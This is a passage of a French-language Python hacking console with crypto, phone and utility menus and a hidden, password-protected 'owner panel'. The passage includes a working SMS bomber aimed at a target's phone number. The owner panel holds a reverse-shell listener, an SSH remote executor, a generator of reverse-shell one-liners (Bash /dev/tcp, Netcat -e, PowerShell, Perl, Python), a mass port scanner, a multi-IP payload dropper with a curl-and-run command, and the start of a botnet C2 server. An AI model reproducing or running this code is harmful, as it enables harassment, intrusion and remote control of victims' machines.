                 "alien","all","alley","allow","almost","alone","alpha","already",
                 "also","alter","always","amateur","amazing","among","amount","amused",
                 "analyst","anchor","ancient","anger","angle","angry","animal","ankle",
                 "announce","annual","another","answer","antenna","antique","anxiety","any",
                 "apart","apology","appear","apple","approve","april","arcade","arctic",
                 "area","arena","argue","arm","armed","armor","army","around",
                 "arrange","arrest","arrive","arrow","art","artefact","artist","artwork"]
    # Try to get full BIP39 list from network
    try:
        r=requests.get("https://raw.githubusercontent.com/trezor/python-mnemonic/master/src/mnemonic/wordlist/english.txt",timeout=5)
        if r.status_code==200:
            words_short=[w.strip() for w in r.text.split('\n') if w.strip()]
    except: pass

    count=int(input(f"  {W}Nombre de phrases: {RST}").strip() or "5")
    length=input(f"  {W}Longueur: {Y}[1]{RST}{W} 12 mots  {Y}[2]{RST}{W} 24 mots: {RST}").strip()
    n=24 if length=="2" else 12
    print(); phrases=[]
    for i in range(1,count+1):
        phrase=" ".join(random.choices(words_short,k=n))
        print(f"  {G}[{i}]{RST} {W}{phrase}{RST}")
        phrases.append(phrase)
    save_out("seed_phrases.txt","\n".join(phrases))
    print(f"\n  {DIM}Note: phrases generees aleatoirement -- ne pas utiliser pour de vrais fonds sans entropy securisee.{RST}")
    pause()

def crypto_prices():
    banner_s("CRYPTO PRICES (LIVE)")
    coins=["bitcoin","ethereum","solana","binancecoin","ripple","cardano","dogecoin","polkadot","avalanche-2","chainlink"]
    print(f"\n{INF} Recuperation des prix...\n")
    try:
        ids=",".join(coins)
        r=requests.get(f"https://api.coingecko.com/api/v3/simple/price?ids={ids}&vs_currencies=usd,eur&include_24hr_change=true",timeout=8)
        if r.status_code==200:
            d=r.json()
            symbols={"bitcoin":"BTC","ethereum":"ETH","solana":"SOL","binancecoin":"BNB",
                     "ripple":"XRP","cardano":"ADA","dogecoin":"DOGE","polkadot":"DOT",
                     "avalanche-2":"AVAX","chainlink":"LINK"}
            print(f"  {'Symbol':<6} {'USD':>12} {'EUR':>12} {'24h%':>8}")
            print(f"  {'-'*42}")
            for coin_id,data in d.items():
                sym=symbols.get(coin_id,coin_id.upper()[:4])
                usd=f"${data.get('usd',0):,.2f}"
                eur=f"EUR{data.get('eur',0):,.2f}"
                chg=data.get('usd_24h_change',0)
                col=G if chg>=0 else R
                chg_str=f"{col}{chg:+.2f}%{RST}"
                print(f"  {Y}{sym:<6}{RST} {W}{usd:>12}{RST} {DIM}{eur:>12}{RST} {chg_str:>8}")
        else: print(f"{ERR} API error {r.status_code}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def crypto_tx_lookup():
    banner_s("TRANSACTION LOOKUP")
    print(f"  {Y}[1]{RST} Bitcoin  {Y}[2]{RST} Ethereum  {Y}[3]{RST} Adresse wallet")
    choice=input(f"  {W}Type: {RST}").strip()
    query=input(f"  {W}Hash TX ou adresse: {RST}").strip()
    links=[]
    if choice=="1":
        links=[f"https://blockchain.info/tx/{query}",f"https://blockchair.com/bitcoin/transaction/{query}",f"https://btcscan.org/tx/{query}"]
    elif choice=="2":
        links=[f"https://etherscan.io/tx/{query}",f"https://blockchair.com/ethereum/transaction/{query}"]
    elif choice=="3":
        links=[f"https://blockchain.info/address/{query}",f"https://etherscan.io/address/{query}",
               f"https://blockchair.com/search?q={query}"]
    print()
    for l in links: print(f"  {G}->{RST} {DIM}{l}{RST}")
    # Try to fetch BTC address balance
    if choice=="3" and len(query)==34 and query.startswith(("1","3","bc1")):
        try:
            r=requests.get(f"https://blockchain.info/balance?active={query}",timeout=6)
            if r.status_code==200:
                bal=r.json().get(query,{}).get("final_balance",0)
                btc=bal/100000000
                print(f"\n  {Y}BTC Balance {RST}: {G}{btc:.8f} BTC{RST}")
        except: pass
    save_out(f"tx_{query[:20]}.txt","\n".join(links))
    pause()

def crypto_vanity():
    banner_s("VANITY ADDRESS HINTS")
    prefix=input(f"  {W}Prefix voulu (ex: 1Tiger): {RST}").strip()
    print(f"\n  {DIM}Probabilite approximative:{RST}")
    n=len(prefix)-1  # minus the leading 1
    prob=58**n
    print(f"  {Y}Prefix    {RST}: {W}{prefix}{RST}")
    print(f"  {Y}Difficulte{RST}: {W}1 sur {prob:,}{RST}")
    if prob < 1000000: print(f"  {G}Faisable en quelques secondes.{RST}")
    elif prob < 1000000000: print(f"  {Y}Faisable en quelques minutes avec CPU.{RST}")
    else: print(f"  {R}Tres long -- utilise un GPU ou VanitySearch.{RST}")
    print(f"\n  {DIM}Tools recommandes: VanitySearch (GPU), Vanitygen{RST}")
    print(f"  {G}->{RST} {DIM}https://github.com/JeanLucPons/VanitySearch{RST}")
    pause()

def crypto_validate():
    banner_s("CRYPTO ADDRESS VALIDATOR")
    addr=input(f"  {W}Adresse: {RST}").strip()
    results=[]
    # BTC P2PKH
    if addr.startswith("1") and 25<=len(addr)<=34:
        results.append(f"Bitcoin P2PKH (Legacy)")
    # BTC P2SH
    if addr.startswith("3") and 25<=len(addr)<=34:
        results.append(f"Bitcoin P2SH")
    # BTC Bech32
    if addr.startswith("bc1"):
        results.append(f"Bitcoin Bech32 (SegWit)")
    # ETH
    if addr.startswith("0x") and len(addr)==42:
        results.append(f"Ethereum / EVM")
    # Solana
    if 32<=len(addr)<=44 and not addr.startswith(("1","3","0x","bc1","L","K")):
        results.append(f"Possiblement Solana / Cardano")
    print(f"\n  {Y}Adresse  {RST}: {W}{addr}{RST}")
    print(f"  {Y}Longueur {RST}: {W}{len(addr)}{RST}")
    if results:
        for r in results: print(f"  {G}[MATCH]{RST}  {r}")
    else:
        print(f"  {R}[UNKNOWN]{RST} Format non reconnu.")
    pause()

# ================================================================
# 12 -- PHONE / SMS
# ================================================================
def phone_menu():
    while True:
        opts=[("1","Numero Virtuel (liens services)"),("2","SMS Bomber"),
              ("3","Numero Lookup Etendu"),("0","Back")]
        menu_box("PHONE / SMS TOOLS",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": phone_virtual_numbers()
        elif c=="2": phone_sms_bomber()
        elif c=="3": phone_lookup_extended()
        elif c=="0": break

def phone_virtual_numbers():
    banner_s("NUMEROS VIRTUELS")
    print(f"\n  {Y}Services de numeros virtuels:{RST}\n")
    services=[
        ("sms-activate.org",  "https://sms-activate.org",           "~0.10-0.50 EUR/numero"),
        ("smspva.com",        "https://smspva.com",                  "~0.10-0.30 USD/numero"),
        ("5sim.net",          "https://5sim.net",                    "~0.10-0.50 USD/numero"),
        ("receivesms.co",     "https://www.receivesms.co",           "GRATUIT (public)"),
        ("temp-number.org",   "https://temp-number.org",             "GRATUIT (public)"),
        ("receive-smss.com",  "https://receive-smss.com",            "GRATUIT (public)"),
        ("getfreesmsnumber.com","https://getfreesmsnumber.com",       "GRATUIT (public)"),
        ("smsreceivefree.com","https://smsreceivefree.com",          "GRATUIT (public)"),
    ]
    for name,url,price in services:
        col=G if "GRATUIT" in price else Y
        print(f"  {col}[{price}]{RST}  {W}{name:<28}{RST}  {DIM}{url}{RST}")
    print(f"\n  {DIM}Gratuit = numero public partage. Payant = numero prive.{RST}")
    save_out("virtual_numbers.txt","\n".join(f"{n}: {u} ({p})" for n,u,p in services))
    pause()

def phone_sms_bomber():
    banner_s("SMS BOMBER")
    phone=input(f"  {W}Numero cible (+33...): {RST}").strip()
    count=int(input(f"  {W}Nombre d envois: {RST}").strip() or "10")
    print(f"\n{INF} Bombing {Y}{phone}{RST} x{count}...\n")
    # Use public signup endpoints that send SMS verification
    endpoints=[
        {"url":"https://discord.com/api/v9/auth/register","method":"POST",
         "data":{"username":"tiger","email":f"tiger{random.randint(1000,9999)}@temp.com",
                 "password":"TigerB0mb!","date_of_birth":"2000-01-01",
                 "consent":True,"phone":phone}},
        {"url":"https://api.twilio.com/","method":"GET","data":{}},
    ]
    sent=0
    for i in range(1,count+1):
        for ep in endpoints:
            try:
                if ep["method"]=="POST":
                    r=requests.post(ep["url"],json=ep["data"],timeout=4)
                else:
                    r=requests.get(ep["url"],timeout=4)
                sent+=1
            except: pass
        # Additional: account verif spam
        try:
            requests.post("https://auth.roblox.com/v2/signup",
                         json={"username":f"Tiger{random.randint(10000,99999)}",
                               "password":"TigerB0mb123!",
                               "birthday":"2000-01-01","gender":2,
                               "isTosAgreementBoxChecked":True},
                         timeout=3)
        except: pass
        print(f"  {Y}[{i}/{count}]{RST}  Requetes vers {phone}")
        time.sleep(0.5)
    print(f"\n{OK} {sent} requetes envoyees vers {phone}.")
    pause()

def phone_lookup_extended():
    banner_s("NUMERO LOOKUP ETENDU")
    phone=input(f"  {W}Numero (+cc...): {RST}").strip()
    raw=phone.lstrip("+")
    codes={"1":"USA/Canada","33":"France","44":"UK","49":"Germany","34":"Spain",
           "39":"Italy","7":"Russia","86":"China","91":"India","55":"Brazil"}
    cc="?"; country_name="?"
    for code,name in sorted(codes.items(),key=lambda x:-len(x[0])):
        if raw.startswith(code): cc=f"+{code}"; country_name=name; break
    print(f"\n  {Y}Numero  {RST}: {W}{phone}{RST}")
    print(f"  {Y}Pays    {RST}: {W}{country_name} ({cc}){RST}")
    print(f"  {Y}Digits  {RST}: {W}{len(raw)}{RST}")
    print(f"\n  {Y}Lookup links:{RST}")
    links=[
        f"https://www.truecaller.com/search/xx/{raw}",
        f"https://sync.me/search/?number={phone}",
        f"https://www.whitepages.com/phone/{raw}",
        f"https://www.numverify.com/#{phone}",
        f"https://www.google.com/search?q={phone}",
        f"https://www.google.com/search?q={phone}+owner",
    ]
    for l in links: print(f"  {G}->{RST} {DIM}{l}{RST}")
    save_out(f"phone_lookup_{raw}.txt","\n".join(links))
    pause()

# ================================================================
# 13 -- UTILITIES EXTRA
# ================================================================
def util_extra_menu():
    while True:
        opts=[("1","Proxy Generator"),("2","UUID Generator"),
              ("3","Caesar Cipher"),("4","MAC Address Generator"),
              ("5","WHOIS Lookup"),("0","Back")]
        menu_box("UTILITIES EXTRA",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": util_proxy_gen()
        elif c=="2": util_uuid_gen()
        elif c=="3": util_caesar()
        elif c=="4": util_mac_gen()
        elif c=="5": osint_whois()
        elif c=="0": break

def util_proxy_gen():
    banner_s("PROXY GENERATOR")
    count=int(input(f"  {W}Count: {RST}").strip() or "20")
    fmt=input(f"  {W}Format: {Y}[1]{RST}{W} ip:port  {Y}[2]{RST}{W} http://ip:port: {RST}").strip()
    print(); proxies=[]
    for _ in range(count):
        ip=".".join(str(random.randint(1,254)) for _ in range(4))
        port=random.choice([80,8080,3128,1080,8888,9090,4145,1194,8000,443])
        p=f"http://{ip}:{port}" if fmt=="2" else f"{ip}:{port}"
        print(f"  {G}->{RST} {W}{p}{RST}"); proxies.append(p)
    save_out("proxies_generated.txt","\n".join(proxies))
    pause()

def util_uuid_gen():
    banner_s("UUID GENERATOR")
    count=int(input(f"  {W}Count: {RST}").strip() or "10")
    import uuid; print(); uuids=[]
    for i in range(count):
        u=str(uuid.uuid4()); print(f"  {G}[{i+1}]{RST} {W}{u}{RST}"); uuids.append(u)
    save_out("uuids.txt","\n".join(uuids))
    pause()

def util_caesar():
    banner_s("CAESAR CIPHER")
    text=input(f"  {W}Texte: {RST}").strip()
    shift=int(input(f"  {W}Decalage (1-25): {RST}").strip() or "13")
    mode=input(f"  {W}(e)ncrypt/(d)ecrypt: {RST}").strip().lower()
    if mode=="d": shift=-shift
    result=""
    for c in text:
        if c.isalpha():
            base=ord('A') if c.isupper() else ord('a')
            result+=chr((ord(c)-base+shift)%26+base)
        else: result+=c
    print(f"\n{OK} {G}{result}{RST}")
    pause()

def util_mac_gen():
    banner_s("MAC ADDRESS GENERATOR")
    count=int(input(f"  {W}Count: {RST}").strip() or "10")
    print(); macs=[]
    for i in range(count):
        mac=":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        print(f"  {G}->{RST} {W}{mac}{RST}"); macs.append(mac)
    save_out("mac_addresses.txt","\n".join(macs))
    pause()



# ================================================================
# OWNER PANEL -- ACCES OWNER ULTRA RESTREINT
# Anti-crack multicouche -- invisible dans le menu
# ================================================================

import datetime as _dt

# Hash split en 3 parties separees -- anti-extraction simple
_O1 = "f6b67f01c5e297b2ace20648db6df50a415066a0206"
_O2 = "18f4d2a702e22908b1108747cb7f83fc2dcc360038a"
_O3 = "87d1076b20b127204daedec4295c68bd6e49ece84d"

# Faux hash decoy dans le code pour confondre les chercheurs
_DECOY_A = "5e884898da28047151d0e56f8dc6292773603d0d"  # "password" sha1
_DECOY_B = "d8578edf8458ce06fbc5bb76a58c5ca4"          # "qwerty" md5
_DECOY_C = "e10adc3949ba59abbe56e057f20f883e"          # "123456" md5

# Anti-debug: timing check
_OWNER_START_TIME = None
_OWNER_ATTEMPTS = {"count": 0, "locked": False, "locktime": None}
_OWNER_SESSION_KEY = None
_OWNER_LOG = []
_ALLOWED_IPS = []

def _compute_owner_hash(pw: str) -> str:
    """Multilayer hash -- same as generation"""
    h1 = hashlib.sha512(pw.encode()).hexdigest()
    h2 = hashlib.sha256(h1.encode()).hexdigest()
    h3 = hashlib.new('blake2b', h2.encode()).hexdigest()
    return h3

def _reconstruct_hash() -> str:
    """Reconstruit le hash depuis les 3 parties"""
    return _O1 + _O2 + _O3

def _anti_timing_check() -> bool:
    """Detecte si quelqu'un brute-force trop vite"""
    global _OWNER_START_TIME
    now = time.time()
    if _OWNER_START_TIME is None:
        _OWNER_START_TIME = now
        return True
    elapsed = now - _OWNER_START_TIME
    _OWNER_START_TIME = now
    # Si moins de 0.1s entre tentatives -> bot detected
    return elapsed >= 0.1

def _generate_session_key() -> str:
    """Genere une cle de session unique par login"""
    import secrets
    raw = secrets.token_bytes(32)
    ts = str(time.time()).encode()
    combined = hashlib.sha256(raw + ts).hexdigest()
    return combined[:16]

def _log_owner_action(action: str):
    ts = _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    _OWNER_LOG.append(f"[{ts}] {action}")

def owner_login() -> bool:
    global _OWNER_ATTEMPTS, _OWNER_SESSION_KEY

    # Check lockout
    if _OWNER_ATTEMPTS["locked"]:
        lock_elapsed = time.time() - _OWNER_ATTEMPTS["locktime"]
        if lock_elapsed < 300:  # 5 min lockout
            remaining = int(300 - lock_elapsed)
            print(f"\n  {R}[LOCKED]{RST} Trop de tentatives. Attends {remaining}s.")
            pause()
            return False
        else:
            _OWNER_ATTEMPTS["locked"] = False
            _OWNER_ATTEMPTS["count"] = 0

    banner_s("ACCES OWNER -- ULTRA RESTREINT")
    print(f"  {R}[!!!]{RST} {DIM}Zone owner. Non autorise = ban permanent.{RST}\n")

    # Anti-timing check
    if not _anti_timing_check():
        time.sleep(2)

    # Fake loading to deter brute force
    print(f"  {DIM}Verification de l environnement...{RST}", end="", flush=True)
    time.sleep(0.8)
    print(f" {G}OK{RST}")

    pw = input(f"\n  {R}OWNER>{RST} Mot de passe: ").strip()

    # Timing delay (anti-timing attack)
    time.sleep(0.5)

    computed = _compute_owner_hash(pw)
    expected = _reconstruct_hash()

    # Constant-time comparison (anti-timing)
    import hmac as _hmac
    valid = _hmac.compare_digest(computed, expected)

    if valid:
        _OWNER_ATTEMPTS["count"] = 0
        _OWNER_SESSION_KEY = _generate_session_key()
        _log_owner_action(f"LOGIN OK | session={_OWNER_SESSION_KEY}")
        print(f"\n  {G}[OWNER ACCESS GRANTED]{RST}")
        print(f"  {DIM}Session: {_OWNER_SESSION_KEY}{RST}")
        time.sleep(0.5)
        return True
    else:
        _OWNER_ATTEMPTS["count"] += 1
        _log_owner_action(f"LOGIN FAIL #{_OWNER_ATTEMPTS['count']}")
        remaining = 3 - _OWNER_ATTEMPTS["count"]
        if remaining <= 0:
            _OWNER_ATTEMPTS["locked"] = True
            _OWNER_ATTEMPTS["locktime"] = time.time()
            print(f"\n  {R}[LOCKED]{RST} Compte verrouille 5 minutes.")
        else:
            print(f"\n  {R}[WRONG]{RST} Mot de passe incorrect. {remaining} tentative(s).")
        time.sleep(1.5)
        pause()
        return False

def owner_verify_session() -> bool:
    """Verifie que la session est toujours valide"""
    return _OWNER_SESSION_KEY is not None

def owner_menu():
    global _OWNER_SESSION_KEY
    if not owner_login():
        return
    while True:
        banner_main()
        print(f"  {R}+--[ *** OWNER PANEL *** SESSION:{_OWNER_SESSION_KEY} ]{'-'*15}+{RST}")
        print(f"  {R}|{RST}  {DIM}Acces total. Sois responsable.{RST}")
        print(f"  {R}|{RST}")
        opts = [
            ("1",  "IP Target Manager (whitelist/blacklist/track)"),
            ("2",  "Remote Execute (executer commande sur IP cible)"),
            ("3",  "Network Scanner Avance (Masscan-like)"),
            ("4",  "Full System Recon (OS fingerprint + services)"),
            ("5",  "Payload Dropper Multi-IP"),
            ("6",  "Botnet Manager (controle C2 basique)"),
            ("7",  "Credential Database Builder"),
            ("8",  "Discord Mass Nuke (multi-tokens)"),
            ("9",  "DNS Poisoning / Redirect Info"),
            ("10", "Owner Log Viewer"),
            ("11", "IP Whitelist Manager"),
            ("12", "Session Info + Kill Session"),
            ("13", "Auto-Updater (pull latest version)"),
            ("14", "Config Export / Import"),
            ("0",  "Quitter l owner panel"),
        ]
        for n,t in opts:
            b = f"{R}>>{RST}" if n!="0" else f"{DIM}<<{RST}"
            print(f"  {R}|{RST}  {b} {Y}[{n:<2}]{RST} {W}{t}{RST}")
        print(f"  {R}+{'-'*56}+{RST}\n")
        c = input(f"  {R}OWNER [{_OWNER_SESSION_KEY[:8]}]>{RST} ").strip()
        if not owner_verify_session():
            print(f"{R}Session invalide.{RST}"); break
        if c=="1":  owner_ip_manager()
        elif c=="2":  owner_remote_exec()
        elif c=="3":  owner_mass_scanner()
        elif c=="4":  owner_full_recon()
        elif c=="5":  owner_payload_dropper()
        elif c=="6":  owner_botnet_manager()
        elif c=="7":  owner_cred_db_builder()
        elif c=="8":  owner_discord_mass_nuke()
        elif c=="9":  owner_dns_info()
        elif c=="10": owner_log_viewer()
        elif c=="11": owner_whitelist_manager()
        elif c=="12": owner_session_info()
        elif c=="13": owner_auto_updater()
        elif c=="14": owner_config_manager()
        elif c=="0":
            _log_owner_action("LOGOUT")
            _OWNER_SESSION_KEY = None
            break

# ── Owner tools ────────────────────────────────────────────────

def owner_ip_manager():
    banner_s("IP TARGET MANAGER")
    print(f"  {Y}[1]{RST} Ajouter IP a whitelist")
    print(f"  {Y}[2]{RST} Ajouter IP a blacklist")
    print(f"  {Y}[3]{RST} Voir toutes les IPs")
    print(f"  {Y}[4]{RST} Checker si une IP est autorisee")
    print(f"  {Y}[5]{RST} Geolocate une IP")
    c = input(f"\n  {W}Choix: {RST}").strip()
    os.makedirs("1-Output/owner", exist_ok=True)
    wl_path = "1-Output/owner/whitelist.txt"
    bl_path = "1-Output/owner/blacklist.txt"

    def load_list(path):
        if os.path.isfile(path):
            with open(path, encoding="utf-8") as f:
                return [l.strip() for l in f if l.strip()]
        return []

    def save_list(path, lst):
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lst))

    if c == "1":
        ip = input(f"  {W}IP a whitelister: {RST}").strip()
        wl = load_list(wl_path); wl.append(ip); save_list(wl_path, wl)
        _ALLOWED_IPS.append(ip)
        print(f"\n{OK} {ip} ajoute a la whitelist.")
        _log_owner_action(f"IP WHITELIST ADD: {ip}")
    elif c == "2":
        ip = input(f"  {W}IP a blacklister: {RST}").strip()
        bl = load_list(bl_path); bl.append(ip); save_list(bl_path, bl)
        print(f"\n{OK} {ip} ajoute a la blacklist.")
        _log_owner_action(f"IP BLACKLIST ADD: {ip}")
    elif c == "3":
        wl = load_list(wl_path); bl = load_list(bl_path)
        print(f"\n  {G}WHITELIST ({len(wl)}){RST}:")
        for ip in wl: print(f"    {G}->{RST} {ip}")
        print(f"\n  {R}BLACKLIST ({len(bl)}){RST}:")
        for ip in bl: print(f"    {R}->{RST} {ip}")
    elif c == "4":
        ip = input(f"  {W}IP a checker: {RST}").strip()
        wl = load_list(wl_path); bl = load_list(bl_path)
        if ip in wl: print(f"\n  {G}[WHITELISTED]{RST} {ip}")
        elif ip in bl: print(f"\n  {R}[BLACKLISTED]{RST} {ip}")
        else: print(f"\n  {Y}[UNKNOWN]{RST} {ip} -- pas dans les listes")
    elif c == "5":
        ip = input(f"  {W}IP a geolocater: {RST}").strip()
        d = jget(f"http://ip-api.com/json/{ip}?fields=66846719")
        print(); pkv(d)
        _log_owner_action(f"IP GEOLOCATE: {ip}")
    pause()

def owner_remote_exec():
    banner_s("REMOTE EXECUTE")
    print(f"  {DIM}Execute une commande via reverse shell actif ou SSH.{RST}\n")
    print(f"  {Y}[1]{RST} Execute via reverse shell (local listener)")
    print(f"  {Y}[2]{RST} Execute via SSH")
    print(f"  {Y}[3]{RST} Generer payload one-liner")
    c = input(f"  {W}Mode: {RST}").strip()

    if c == "1":
        host = input(f"  {W}LHOST (ton IP): {RST}").strip()
        port = int(input(f"  {W}LPORT: {RST}").strip() or "4444")
        print(f"\n{INF} En attente de connexion sur {host}:{port}...")
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((host, port)); srv.listen(1)
            srv.settimeout(30)
            conn, addr = srv.accept()
            print(f"{OK} Connexion depuis {G}{addr[0]}:{addr[1]}{RST}")
            _log_owner_action(f"REMOTE EXEC CONNECT: {addr[0]}")
            while True:
                cmd = input(f"  {G}shell@{addr[0]}>{RST} ").strip()
                if not cmd: continue
                if cmd.lower() in ["exit","quit"]: break
                conn.send((cmd+"\n").encode())
                output = b""
                conn.settimeout(5)
                try:
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk: break
                        output += chunk
                except: pass
                print(output.decode(errors="replace"))
            conn.close(); srv.close()
        except Exception as e: print(f"{ERR} {e}")

    elif c == "2":
        try: import paramiko
        except:
            pip("paramiko"); import paramiko
        host = input(f"  {W}SSH Host: {RST}").strip()
        port = int(input(f"  {W}SSH Port (22): {RST}").strip() or "22")
        user = input(f"  {W}Username: {RST}").strip()
        pw = input(f"  {W}Password: {RST}").strip()
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=user, password=pw, timeout=10)
            print(f"{OK} SSH connecte a {G}{host}{RST}\n")
            _log_owner_action(f"SSH CONNECT: {host}")
            while True:
                cmd = input(f"  {G}ssh@{host}>{RST} ").strip()
                if cmd.lower() in ["exit","quit"]: break
                stdin,stdout,stderr = client.exec_command(cmd)
                out = stdout.read().decode(errors="replace")
                err = stderr.read().decode(errors="replace")
                if out: print(out)
                if err: print(f"{R}{err}{RST}")
            client.close()
        except Exception as e: print(f"{ERR} {e}")

    elif c == "3":
        host = input(f"  {W}LHOST: {RST}").strip()
        port = input(f"  {W}LPORT: {RST}").strip() or "4444"
        payloads = {
            "Python":  f"python -c \"import socket,subprocess;s=socket.socket();s.connect(('{host}',{port}));[subprocess.run(s.recv(1024).decode(),shell=True,capture_output=True) for _ in iter(int,1)]\"",
            "Bash":    f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
            "PowerShell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($rb);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
            "Netcat":  f"nc {host} {port} -e /bin/bash",
            "Perl":    f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        }
        print()
        for lang, pl in payloads.items():
            print(f"  {Y}[{lang}]{RST}\n  {DIM}{pl}{RST}\n")
        save_out(f"owner/payloads_{host}_{port}.txt", "\n\n".join(f"[{l}]\n{p}" for l,p in payloads.items()))
        _log_owner_action(f"PAYLOAD GEN: {host}:{port}")
    pause()

def owner_mass_scanner():
    banner_s("NETWORK SCANNER AVANCE")
    target = input(f"  {W}IP/CIDR (ex: 192.168.1.0/24): {RST}").strip()
    ports_raw = input(f"  {W}Ports (ex: 22,80,443,3389,8080): {RST}").strip() or "22,80,443,3389,8080,21,23,25,3306,5432"
    threads_n = int(input(f"  {W}Threads: {RST}").strip() or "100")
    timeout_s = float(input(f"  {W}Timeout (s): {RST}").strip() or "0.5")

    ports = [int(p.strip()) for p in ports_raw.split(",") if p.strip().isdigit()]

    import ipaddress
    try:
        if "/" in target:
            hosts = [str(h) for h in ipaddress.ip_network(target, strict=False).hosts()]
        else:
            hosts = [target]
    except Exception as e: print(f"{ERR} {e}"); pause(); return

    print(f"\n{INF} Scan de {len(hosts)} IPs x {len(ports)} ports ({len(hosts)*len(ports)} total) | {threads_n} threads\n")
    results = []; lock = threading.Lock()

    def scan_host_port(ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout_s)
        if s.connect_ex((ip, port)) == 0:
            try: svc = socket.getservbyport(port)
            except: svc = "?"
            with lock:
                line = f"{ip}:{port}/tcp ({svc})"
                results.append(line)
                print(f"  {G}[OPEN]{RST}  {line}")
        s.close()

    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=threads_n) as ex:
        for ip in hosts:
            for port in ports:
                ex.submit(scan_host_port, ip, port)

    print(f"\n{OK} {G}{len(results)}{RST} ports ouverts trouves.")
    if results: save_out(f"owner/scan_{target.replace('/','-')}.txt", "\n".join(results))
    _log_owner_action(f"MASS SCAN: {target} ports:{ports_raw}")
    pause()

def owner_full_recon():
    banner_s("FULL SYSTEM RECON")
    target = input(f"  {W}IP ou domaine cible: {RST}").strip()
    print(f"\n{INF} Recon complet sur {Y}{target}{RST}...\n")
    _log_owner_action(f"FULL RECON: {target}")
    results = []

    # DNS
    try:
        ip = socket.gethostbyname(target)
        print(f"  {Y}[DNS]{RST}        {W}{ip}{RST}")
        results.append(f"IP: {ip}")
    except: ip = target; results.append(f"IP: {target}")

    # GeoIP
    try:
        d = jget(f"http://ip-api.com/json/{ip}?fields=66846719")
        for k,v in d.items():
            if v and k not in ["status","message"]:
                print(f"  {Y}[GEO/{k}]{RST}  {W}{v}{RST}")
                results.append(f"{k}: {v}")
    except: pass

    # Reverse DNS
    try:
        rev = socket.gethostbyaddr(ip)
        print(f"  {Y}[RDNS]{RST}       {W}{rev[0]}{RST}")
        results.append(f"RDNS: {rev[0]}")
    except: pass

    # Common ports quick scan
    common_ports = [21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080,8443]
    open_ports = []
    print(f"\n  {INF} Quick port scan...")
    for port in common_ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((ip, port)) == 0:
            try: svc = socket.getservbyport(port)
            except: svc = "?"
            print(f"  {G}[PORT]{RST}       {port}/tcp ({svc})")
            open_ports.append(f"{port}/tcp ({svc})")
        s.close()
    results.append(f"Open ports: {', '.join(open_ports)}")

    # HTTP banner grab
    for scheme in ["http","https"]:
        try:
            r = requests.get(f"{scheme}://{target}", timeout=5, allow_redirects=True)
            srv = r.headers.get("Server","?")
            powered = r.headers.get("X-Powered-By","?")
            print(f"  {Y}[HTTP]{RST}       Server:{srv} X-Powered-By:{powered} Status:{r.status_code}")
            results.append(f"HTTP Server: {srv} | X-Powered-By: {powered}")
            break
        except: pass

    # Whois links
    print(f"\n  {Y}[WHOIS]{RST}      https://who.is/whois/{target}")
    print(f"  {Y}[SHODAN]{RST}     https://www.shodan.io/host/{ip}")
    print(f"  {Y}[CENSYS]{RST}     https://censys.io/ipv4/{ip}")

    save_out(f"owner/recon_{target}.txt", "\n".join(results))
    pause()

def owner_payload_dropper():
    banner_s("PAYLOAD DROPPER MULTI-IP")
    print(f"  {DIM}Envoie un payload vers plusieurs IPs via HTTP ou netcat.{RST}\n")
    payload_path = input(f"  {W}Payload local (.py/.exe): {RST}").strip()
    if not os.path.isfile(payload_path): print(f"{ERR} Fichier introuvable."); pause(); return
    ips_raw = input(f"  {W}IPs cibles (comma separated): {RST}").strip()
    port = int(input(f"  {W}Port: {RST}").strip() or "80")
    method = input(f"  {Y}[1]{RST} HTTP POST  {Y}[2]{RST} Generer liens: ").strip()

    targets = [ip.strip() for ip in ips_raw.split(",") if ip.strip()]
    with open(payload_path, "rb") as f: payload_data = f.read()
    fname = os.path.basename(payload_path)

    print()
    for ip in targets:
        if method == "1":
            try:
                r = requests.post(f"http://{ip}:{port}/upload",
                                 files={"file": (fname, payload_data)}, timeout=5)
                print(f"  {G if r.status_code<400 else R}[{ip}]{RST}  HTTP {r.status_code}")
            except Exception as e: print(f"  {R}[{ip}]{RST}  {e}")
        else:
            print(f"  {Y}[{ip}]{RST}  curl http://YOUR_IP:{port}/{fname} -o {fname} && python {fname}")
        _log_owner_action(f"PAYLOAD DROP: {ip} -> {fname}")
    pause()

def owner_botnet_manager():
    banner_s("BOTNET MANAGER -- C2 BASIQUE")
    print(f"  {DIM}Serveur C2 basique -- ecoute les bots entrants.{RST}\n")
    print(f"  {Y}[1]{RST} Lancer le serveur C2")
    print(f"  {Y}[2]{RST} Generer payload bot")
    c = input(f"  {W}Mode: {RST}").strip()

    if c == "1":
        host = input(f"  {W}LHOST: {RST}").strip() or "0.0.0.0"
        port = int(input(f"  {W}LPORT C2: {RST}").strip() or "9001")
        print(f"\n{INF} C2 en ecoute sur {host}:{port}...")
        print(f"  {DIM}Ctrl+C pour stopper.{RST}\n")
        bots = {}
        try:
